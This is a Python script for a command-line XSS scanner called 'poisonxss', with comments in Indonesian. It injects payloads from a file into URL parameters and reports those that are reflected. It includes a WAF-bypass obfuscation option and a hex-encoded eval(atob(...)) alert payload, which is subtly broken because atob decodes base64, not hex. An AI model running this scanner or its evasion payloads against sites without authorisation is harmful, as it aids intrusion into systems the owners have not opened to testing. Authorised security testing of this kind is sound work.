import argparse
import requests
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import Fore, init
from datetime import datetime
import random
import string

# Inisialisasi colorama untuk mendukung pewarnaan teks di terminal
init(autoreset=True)


def send_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None


def generate_obfuscated_payload(payload):
    obfuscated_payload = payload.replace(
        "<script>", "/*<*/script/*>*/").replace("</script>", "/*<*/script/*>*/")
    return obfuscated_payload


def generate_random_payload():
    basic_payload = "<script>alert('XSS');</script>"
    payload_base64 = basic_payload.encode('utf-8').hex()
    return f"eval(atob('{payload_base64}'))"


def test_xss(url, xss_payloads, output_file=None):
    print(f"[INFO] Testing XSS on {url}\n")
    results = []
    vulnerable_params = {}  # Untuk menyimpan parameter rentan
    vulnerable_urls = []   # Untuk menyimpan URL rentan
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parse_qs(parsed_url.query)

    if not params:
        print("[INFO] No parameters found in the URL to test.")
        return

    # Cek setiap parameter URL untuk kerentanannya
    for param_name in params:
        for payload in xss_payloads:
            timestamp = datetime.now().strftime('%H:%M:%S')  # Waktu sekarang
            modified_params = {**params, param_name: [payload]}
            query_string = urlencode(modified_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            print(
                f"[{Fore.BLUE}{timestamp}{Fore.WHITE}][TESTING] XSS URL: {test_url}")

            response = send_request(test_url)

            if response and payload in response.text:
                result = f"[{Fore.LIGHTBLUE_EX}{timestamp}{Fore.WHITE}][{Fore.RED}VULNERABLE - XSS{Fore.WHITE}] Parameter '{param_name}' executed payload: {payload}{Fore.RESET}"
                print(result)
                results.append(result)
                # Tambahkan parameter rentan ke dictionary
                if param_name not in vulnerable_params:
                    vulnerable_params[param_name] = {"count": 0, "type": "XSS"}
                vulnerable_params[param_name]["count"] += 1
                # Tambahkan URL rentan ke daftar
                vulnerable_urls.append(test_url)
            else:
                print(
                    f"[{Fore.BLUE}{timestamp}{Fore.WHITE}]{Fore.WHITE}[SAFE - XSS] Parameter '{param_name}' did not execute payload: {payload}"
                )

    # Tampilkan hasil akhir
    if vulnerable_params:
        print(f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] Vulnerable parameters found:")
        for param, details in vulnerable_params.items():
            print(
                f"- Parameter: '{Fore.GREEN}{param}{Fore.WHITE}' | Count: {details['count']} | Type: {Fore.RED}{details['type']}")
        print(f"\nTotal vulnerable parameters: {Fore.RED}{len(vulnerable_params)}")

        print(f"\n[{Fore.GREEN}DETAIL{Fore.WHITE}] Vulnerable URLs:")
        for url in vulnerable_urls:
            print(f"{Fore.RED}- {url}")
    else:
        print(f"\n[{Fore.GREEN}SUMMARY{Fore.WHITE}] No vulnerable parameters found.")

    if output_file:
        with open(output_file, 'a') as file:
            file.write("\n".join(results) + "\n")
        print(
            f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Results saved to: {output_file}")


def load_payloads(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[ERROR] Payload file not found! Exiting.")
        return []


def main():
    print(r"""
                 _                                
    ____  ____  (_)________  ____  _  ____________
   / __ \/ __ \/ / ___/ __ \/ __ \| |/_/ ___/ ___/
  / /_/ / /_/ / (__  ) /_/ / / / />  <(__  |__  ) 
 / .___/\____/_/____/\____/_/ /_/_/|_/____/____/  
/_/                                               

   XSS Vulnerability Testing Tool
    """)

    parser = argparse.ArgumentParser(description="XSS Vulnerability Tester")
    parser.add_argument(
        "-u", "--url", help="Single URL to test (e.g., https://example.com/search?q=test)"
    )
    parser.add_argument(
        "-f", "--file", help="File containing multiple URLs to test"
    )
    parser.add_argument(
        "-p", "--payloads", required=True, help="File containing XSS payloads"
    )
    parser.add_argument(
        "-o", "--output", help="Output file to save results (optional)"
    )
    parser.add_argument(
        "--use-obfuscation", action="store_true",
        help="Use obfuscation to bypass WAF"
    )

    args = parser.parse_args()

    if not args.url and not args.file:
        print("[ERROR] Either --url or --file must be provided. Exiting.")
        return

    payloads = load_payloads(args.payloads)
    if not payloads:
        print("[ERROR] No payloads loaded. Exiting.")
        return

    if args.url:
        urls = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print("[ERROR] URL file not found! Exiting.")
            return

    for url in urls:
        if args.use_obfuscation:
            bypassed_payloads = [generate_obfuscated_payload(
                p) for p in payloads] + [generate_random_payload()]
        else:
            bypassed_payloads = payloads + [generate_random_payload()]
        test_xss(url, bypassed_payloads, output_file=args.output)


if __name__ == "__main__":
    main()
